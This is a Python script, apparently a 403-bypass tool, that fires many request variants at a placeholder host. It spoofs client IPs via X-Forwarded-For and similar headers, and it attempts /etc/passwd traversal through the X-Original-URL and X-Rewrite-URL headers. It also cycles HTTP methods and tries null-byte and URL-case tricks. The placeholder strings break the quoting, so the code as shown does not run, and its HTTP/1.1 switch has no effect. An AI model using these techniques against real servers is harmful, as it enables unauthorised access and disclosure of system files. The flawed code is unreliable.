import requests
from requests.exceptions import RequestException
from urllib.parse import quote
import random
import time

# Define the URL and common headers
url = "https://"add your host here"/"
common_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

# Different user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Different additional headers
additional_headers = [
    {"Referer": "https://google.com"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"Origin": "https://"add your host here""},
    {"X-Forwarded-Host": ""add your host here""},
    {"X-Forwarded-Proto": "https"},
    {"Forwarded": "for=127.0.0.1;proto=https"},
    {"X-Original-URL": "/signup%2e%2e%2fetc%2fpasswd"},
    {"X-Rewrite-URL": "/signup%2e%2e%2fetc%2fpasswd"},
    {"Referer": "https://"add your host here"/signup%2e%2e%2fetc%2fpasswd"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-Host": ""add your host here""},
    {"X-Forwarded-Server": ""add your host here""}
]

# Different HTTP methods
http_methods = ["GET", "HEAD", "OPTIONS", "TRACE", "POST", "PUT", "DELETE", "PATCH"]

# Proxies (if needed, add your proxy settings here)
proxies = [
    None,
    # "http://proxy1.example.com:8080",
    # "http://proxy2.example.com:8080"
]

# Function to make a request and check the response
def make_request(headers, method="GET", url=url, proxies=None):
    try:
        response = requests.request(method, url, headers=headers, proxies=proxies, timeout=5)
        print(f"Status Code: {response.status_code}")
        if response.status_code == 200:
            print("Bypass Successful")
            print("Headers Used:", headers)
            print("HTTP Method Used:", method)
            print("Response Content:", response.text[:500])  # Print the first 500 characters of the response
            return True
    except RequestException as e:
        print(f"Request failed: {e}")
    return False

# Try different user agents, headers, methods, and proxies
for user_agent in user_agents:
    common_headers["User-Agent"] = user_agent
    for extra_header in additional_headers:
        common_headers.update(extra_header)
        for method in http_methods:
            for proxy in proxies:
                if make_request(common_headers, method, url, proxy):
                    break
                # Wait a bit between requests to avoid rate-limiting
                time.sleep(random.uniform(0.5, 2.0))

# Try URL encoding the URL
encoded_url = quote(url, safe=':/?=&')
print(f"Encoded URL: {encoded_url}")
if make_request(common_headers, "GET", encoded_url):
    print("Bypass Successful with URL Encoding")

# Try using HTTP/1.1 instead of HTTP/2
session = requests.Session()
request = requests.Request('GET', url, headers=common_headers)
prepped = session.prepare_request(request)
prepped.url = prepped.url.replace("HTTP/2", "HTTP/1.1")
response = session.send(prepped)
print(f"HTTP/1.1 Status Code: {response.status_code}")
if response.status_code == 200:
    print("Bypass Successful with HTTP/1.1")

# Try different case variations of the URL
case_variations = [
    url.upper(),
    url.lower(),
    url.capitalize(),
    url.title()
]

for case_var in case_variations:
    print(f"Trying URL case variation: {case_var}")
    if make_request(common_headers, "GET", case_var):
        print("Bypass Successful with URL Case Variation")

# Try adding a random query parameter to the URL
random_param_url = f"{url}?{random.randint(1, 100000)}"
print(f"Trying URL with random query parameter: {random_param_url}")
if make_request(common_headers, "GET", random_param_url):
    print("Bypass Successful with Random Query Parameter")

# Try injecting null byte
null_byte_url = f"{url}%00"
print(f"Trying URL with null byte injection: {null_byte_url}")
if make_request(common_headers, "GET", null_byte_url):
    print("Bypass Successful with Null Byte Injection")

# Specific request mentioned
specific_headers = {
    "Host": ""add your host here"",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1",
    "Origin": "https://"add your host here"",
    "X-Forwarded-Host": ""add your host here"",
    "X-Rewrite-URL": ""
}

print("Trying specific request with all HTTP methods and additional headers")
for method in http_methods:
    if make_request(specific_headers, method):
        print(f"Bypass Successful with specific {method} request")
